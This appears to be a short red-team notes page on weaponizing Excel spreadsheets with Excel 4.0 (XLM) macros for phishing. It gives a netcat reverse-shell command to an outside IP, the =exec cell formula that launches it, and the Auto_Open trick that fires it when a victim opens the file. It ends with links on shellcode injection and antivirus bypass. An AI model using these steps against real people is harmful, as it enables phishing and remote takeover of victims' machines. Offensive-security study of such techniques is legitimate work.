# ⭕ XLM Macro 4.0

{% embed url="https://outflank.nl/blog/2018/10/06/old-school-evil-excel-4-0-macros-xlm" %}

{% embed url="https://fortynorthsecurity.com/blog/excelntdonut" %}

A Microsoft Excel Spreadsheet can be weaponized by firstly inserting a new sheet of type "MS Execel 4.0 Macro":

![](<../../.gitbook/assets/image (38) (1).png>)

shell.cmd :&#x20;

```
C:\tools\nc.exe 10.0.0.5 443 -e cmd.exe
```

We can then execute command by typing into the cells:

```vba
=exec("c:\shell.cmd")
=halt()
```

Note how we need to rename the `A1` cell to `Auto_Open` if we want the Macros to fire off once the document is opened:

![](<../../.gitbook/assets/image (20) (1).png>)

{% file src="../../.gitbook/assets/Excel 4.0 Macro Functions Reference (1).pdf" %}

{% file src="../../.gitbook/assets/phishing-xlm.xlsm" %}

Opening the document and enabling Macros pops a reverse shell:

![](<../../.gitbook/assets/image (15).png>)

Note that XLM Macros allows using Win32 APIs, hence shellcode injection is also possible. See the original research link below for more info.

{% embed url="https://blog.sevagas.com/Launch-shellcodes-and-bypass-Antivirus-using-MacroPack-Pro-VBA-payloads" %}

{% embed url="https://www.scriptjunkie.us/2012/01/direct-shellcode-execution-in-ms-office-macros" %}

{% embed url="https://malsechunter.wordpress.com/2020/12/13/malicious-document-shellcode-injection" %}

{% embed url="https://securityonline.info/badassmacros-c-based-automated-malicous-macro-generator" %}
